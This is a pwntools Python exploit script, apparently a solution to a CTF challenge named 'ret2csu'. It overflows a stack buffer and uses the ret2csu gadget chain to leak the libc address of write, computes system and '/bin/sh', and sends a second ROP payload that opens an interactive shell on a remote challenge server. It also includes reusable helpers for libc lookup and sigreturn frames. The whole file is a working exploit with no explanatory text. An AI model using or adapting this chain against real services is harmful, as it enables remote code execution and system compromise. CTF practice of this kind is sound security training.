from pwn import *
from LibcSearcher import *

context(arch="amd64", os="linux", log_level="debug")
context.terminal = ["tmux", "split", "-h"]
# context(arch="amd64",os="linux",log_level="debug")
binary = "./ret2csu/ret2csu"
libc = "./ret2csu/libc.so.6"

rop = ROP(binary)
elf = ELF(binary)

libc_elf = ELF(libc)
# libc_dll = cdll.LoadLibrary(libc)


local = 1

ip, port = "61.147.171.105", 29218
# ip, port = "chall.pwnable.tw" 1
if local == 0:
    p = process(binary)
    dbg = lambda p: gdb.attach(p)
else:
    # p = remote(ip, port)
    # p = remote("pwn.challenge.ctf.show",port)
    # p = remote("node5.buuoj.cn", port)
    p = remote("node5.anna.nssctf.cn", port)

    dbg = lambda _: None


ls = lambda addr: log.success(hex(addr))


def search(func_name: str, func_addr: int):
    log.success(func_name + ": " + hex(func_addr))
    libc = LibcSearcher(func_name, func_addr)
    offset = func_addr - libc.dump(func_name)
    binsh = offset + libc.dump("str_bin_sh")
    system = offset + libc.dump("system")
    log.success("system: " + hex(system))
    log.success("binsh: " + hex(binsh))
    return (system, binsh)


def search_from_libc(func_name: str, func_addr: int, libc=libc_elf):
    log.success(func_name + ": " + hex(func_addr))
    offset = func_addr - libc.symbols[func_name]
    binsh = offset + libc.search(b"/bin/sh").__next__()
    system = offset + libc.symbols["system"]
    log.success("system: " + hex(system))
    log.success("binsh: " + hex(binsh))
    return (system, binsh)


# __libc_start_main

csu_start = 0x401290


def csu(edi=0, rsi=0, rdx=0, r12=0, start=csu_start):
    end = start + 0x1A
    payload = p64(end)
    payload += p64(0)  # rbx
    payload += p64(1)  # rbp
    payload += p64(r12)  # r12
    payload += p64(edi)  # edi
    payload += p64(rsi)  # rsi
    payload += p64(rdx)  # rdx
    payload += p64(start)
    payload += b"a" * 56
    return payload


def sig(rax=0, rdi=0, rsi=0, rdx=0, rsp=0, rip=0):
    sigframe = SigreturnFrame()
    sigframe.rax = rax
    sigframe.rdi = rdi  # "/bin/sh" 's addr
    sigframe.rsi = rsi
    sigframe.rdx = rdx
    sigframe.rsp = rsp
    sigframe.rip = rip
    return bytes(sigframe)


# =================start=================#
write_plt = elf.plt["write"]
write_got = elf.got["write"]
read_plt = elf.plt["read"]
read_got = elf.got["read"]
rdi_addr = 0x00000000004012B3
ret_addr = 0x000000000040101A

payload = b"a" * 0x108
payload += csu(edi=write_got, rsi=0x100, rdx=write_got, r12=1)
payload += p64(0x401176)
# dbg(p)

assert len(payload) < 0x200

p.sendline(payload)

p.recvline()
p.recvline()
p.recvline()
write_addr = u64(p.recv(8))
sys, sh = search_from_libc("write", write_addr)

payload = b"a" * 0x108
payload += p64(ret_addr)
payload += p64(rdi_addr)
payload += p64(sh)
payload += p64(sys)
dbg(p)

assert len(payload) < 0x200

p.sendline(payload)
p.interactive()
